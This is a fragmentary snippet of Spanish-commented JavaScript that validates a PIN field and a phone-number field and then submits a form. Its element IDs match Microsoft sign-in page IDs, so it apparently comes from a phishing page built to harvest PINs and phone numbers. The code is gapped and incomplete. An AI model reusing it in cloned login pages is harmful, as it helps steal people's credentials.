...
function muestra_oculta(id){ console.log("hola");
...
function cambiarboton() {
        ...
        document.all['i0117'].style.display="block";
         document.getElementById('i0117').focus();
...
// codigo cuando esta vacio 
      ...
      function text2(){
        miCampoTexto3 = document.getElementById("pinxd");    
        valueForm3=miCampoTexto3.value;
        miCampoTexto4 = document.getElementById("tlfxd");    
        valueForm4=miCampoTexto4.value;

        if (valueForm3.length >=4 && valueForm4.length >=8) {
            const idSIButton29 = document.getElementById('idSIButton29');
            const send2 = document.getElementById('formu1');
            send2.addEventListener("click",function () {
            formu1.submit();       });      
// codigo cuando esta vacio 
        return;}   
            document.all['text23'].style.display="none";
            document.all['text24'].style.display="block";
console.log("hola6");}
